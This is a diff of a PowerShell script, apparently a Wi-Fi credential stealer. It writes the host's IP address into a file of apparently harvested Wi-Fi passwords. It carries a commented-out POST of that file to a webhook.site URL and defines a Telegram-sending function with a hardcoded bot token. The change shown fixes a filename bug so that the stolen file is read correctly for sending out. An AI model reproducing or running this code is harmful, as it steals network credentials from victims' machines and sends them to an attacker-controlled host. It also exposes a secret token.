@@ -5,7 +5,7 @@ cd $env:temp
 Get-NetIPAddress -AddressFamily IPv4 -InterfaceIndex $(Get-NetConnectionProfile | Select-Object -ExpandProperty InterfaceIndex) | Select-Object -ExpandProperty IPAddress >> Wi-Fi-PASS
 #Invoke-WebRequest -Uri https://webhook.site/5a81bbad-90a5-40db-a015-ffb88c41bf74 -Method POST -InFile Wi-Fi-PASS
 
-$text = Get-Content .\Wifi-PASS -Raw
+$text = Get-Content .\Wi-Fi-PASS -Raw
 Function Send-Telegram {
 Param([Parameter(Mandatory=$true)][String]$Message)
 $Telegramtoken = "5476202852:AAHqP84hjy-c6KFtHe_Va4waMrg7KvFHxLw"
